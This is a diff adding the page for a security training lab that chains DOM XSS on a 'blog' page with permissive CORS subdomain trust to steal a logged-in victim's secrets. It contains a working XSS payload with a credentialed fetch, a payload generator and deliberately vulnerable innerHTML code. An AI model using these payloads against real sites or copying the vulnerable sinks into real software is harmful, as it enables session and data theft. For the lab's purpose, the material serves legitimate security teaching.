@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: CORS + XSS = Session Hijack - Chain Level 6</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">Chain #6: CORS + XSS = Session Hijack</span>
+      <span class="difficulty hard">Hard</span>
+    </div>
+  </div>
+  <div id="solve-banner" class="solve-banner"></div>
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>The main API trusts <code>*.localhost</code> origins (CORS). A "blog" subdomain page has DOM XSS. Chain: exploit the XSS on the blog to make a credentialed CORS request to the API and steal the victim's secrets.</p>
+      </div>
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: Two separate bugs</button>
+        <div class="hint-content"><strong>Bug 1:</strong> The blog page at the bottom has innerHTML XSS via the <code>?post=</code> parameter.<br><strong>Bug 2:</strong> <code>/api/cors-demo/subdomain-data</code> trusts any <code>*.localhost</code> origin with credentials.<br>Neither bug alone is critical. Together: CRITICAL.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: The XSS payload</button>
+        <div class="hint-content">Craft a <code>?post=</code> value that injects a script to fetch the CORS-protected API with credentials and exfiltrate the data. The XSS runs on the blog's origin, which is trusted by CORS.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Full chain payload</button>
+        <div class="hint-content"><code>?post=&lt;img src=x onerror="fetch('/api/cors-demo/secrets',{credentials:'include'}).then(r=>r.json()).then(d=>document.getElementById('blog-post').innerHTML=JSON.stringify(d))"&gt;</code><br>The XSS on the "subdomain" makes a credentialed fetch. Since the blog origin is trusted by CORS, the browser allows reading the response.</div>
+      </div>
+      <h3>Attack Chain</h3>
+      <div class="source-code">
+<pre><span class="comment">// Bug 1: XSS on blog subdomain</span>
+blog.localhost/?post=<span class="sink">&lt;script&gt;...&lt;/script&gt;</span>
+
+<span class="comment">// Bug 2: CORS trusts *.localhost</span>
+Access-Control-Allow-Origin: <span class="sink">blog.localhost</span>
+Access-Control-Allow-Credentials: <span class="sink">true</span>
+
+<span class="comment">// Chain: XSS → credentialed CORS fetch</span>
+<span class="function">fetch</span>('/api/cors-demo/secrets', {
+  credentials: 'include'
+}).then(r => r.json())
+  .then(d => <span class="sink">exfiltrate</span>(d));
+</pre>
+      </div>
+    </div>
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128274; Login as Victim</h2>
+          <div style="display:flex;gap:8px;align-items:end">
+            <div style="flex:1"><label>Username</label><input type="text" id="loginUser" value="victim" style="margin-bottom:0"></div>
+            <div style="flex:1"><label>Password</label><input type="password" id="loginPass" value="password123" style="margin-bottom:0"></div>
+            <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          </div>
+          <div id="login-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div class="lab-form" style="margin-top:16px">
+          <h2 style="margin-bottom:16px">&#128221; Blog Page (has XSS)</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">This blog page reflects the <code>?post=</code> parameter via innerHTML. It's on a "subdomain" trusted by the main API's CORS policy.</p>
+          <label>Blog post content (or use ?post= in URL)</label>
+          <input type="text" id="postInput" placeholder="<img src=x onerror=alert(1)>">
+          <button class="btn btn-primary" onclick="location.search='?post='+encodeURIComponent(document.getElementById('postInput').value)">Load Post</button>
+          <div id="blog-post" class="vuln-output" style="margin-top:12px;min-height:60px">
+            <p style="color:var(--text-muted)">Enter a blog post above...</p>
+          </div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <div class="lab-form" style="border:2px solid var(--danger);background:var(--danger-light)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Craft CORS+XSS Chain Payload</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Build an XSS payload that fetches the CORS-protected API and displays the stolen data.</p>
+          <button class="btn btn-danger" onclick="generateChainPayload()">Generate Chain Payload</button>
+          <div id="payload-display" style="margin-top:8px;display:none">
+            <label>Payload URL:</label>
+            <textarea id="payloadUrl" rows="3" readonly style="font-family:monospace;font-size:11px"></textarea>
+            <button class="btn btn-danger" onclick="executeChain()" style="margin-top:8px">Execute Chain</button>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">Stolen via CORS+XSS Chain</div>
+            <div id="stolen-data"><div class="log" style="color:#94a3b8">No data stolen yet...</div></div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px">
+          <p style="font-size:13px;color:var(--text-secondary)"><strong>Real-world context:</strong> This is one of the most common high-value chains in bug bounty. The Indeed GraphQL API trusted <code>*.indeed.com</code> with credentials. Finding XSS on ANY indeed.com subdomain would give full API access. Similarly, Acorns trusted <code>*.acorns.com</code>. The key insight: CORS subdomain trust turns any subdomain XSS into a critical data theft bug.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="/js/app.js"></script>
+  <script>
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include',
+        body: JSON.stringify({username:document.getElementById('loginUser').value, password:document.getElementById('loginPass').value})
+      }).then(r=>r.json()).then(d => {
+        document.getElementById('login-status').innerHTML = d.success ?
+          '<span style="color:var(--success)">Logged in as '+d.user.username+'</span>' : '<span style="color:var(--danger)">Failed</span>';
+      });
+    }
+
+    // Render blog post from URL (VULNERABLE: innerHTML)
+    var params = new URLSearchParams(location.search);
+    var post = params.get('post');
+    if (post) {
+      document.getElementById('postInput').value = post;
+      // VULNERABLE: innerHTML with URL parameter
+      document.getElementById('blog-post').innerHTML = '<div style="padding:8px">' + post + '</div>';
+    }
+
+    function generateChainPayload() {
+      var payload = '<img src=x onerror="fetch(\'/api/cors-demo/secrets\',{credentials:\'include\'}).then(r=>r.json()).then(d=>{document.getElementById(\'blog-post\').innerHTML=\'<pre>\'+JSON.stringify(d,null,2)+\'</pre>\';document.getElementById(\'stolen-data\').innerHTML=\'<div class=log style=color:#ef4444>API Key: \'+d.apiKey+\'</div><div class=log style=color:#ef4444>SSN: \'+d.ssn_last4+\'</div><div class=log style=color:#ef4444>Sessions: \'+JSON.stringify(d.sessions)+\'</div>\'})">';
+      var url = location.origin + location.pathname + '?post=' + encodeURIComponent(payload);
+      document.getElementById('payload-display').style.display = 'block';
+      document.getElementById('payloadUrl').value = url;
+    }
+
+    function executeChain() {
+      var url = document.getElementById('payloadUrl').value;
+      var postParam = new URL(url).searchParams.get('post');
+      if (postParam) {
+        document.getElementById('blog-post').innerHTML = '<div style="padding:8px">' + postParam + '</div>';
+
+        // Check if secrets were stolen
+        setTimeout(function() {
+          var stolen = document.getElementById('stolen-data');
+          if (stolen.innerHTML.includes('API Key') || document.getElementById('blog-post').innerHTML.includes('apiKey')) {
+            solveLab('chain-6');
+            stolen.innerHTML += '<div class="log" style="color:#ef4444">--- CORS+XSS CHAIN COMPLETE ---</div>';
+          }
+        }, 2000);
+      }
+    }
+
+    fetch('/api/auth/me',{credentials:'include'}).then(r=>r.json()).then(d=>{
+      if(d.user) document.getElementById('login-status').innerHTML='<span style="color:var(--success)">Logged in as '+d.user.username+'</span>';
+    }).catch(()=>{});
+  </script>
+</body>
+</html>
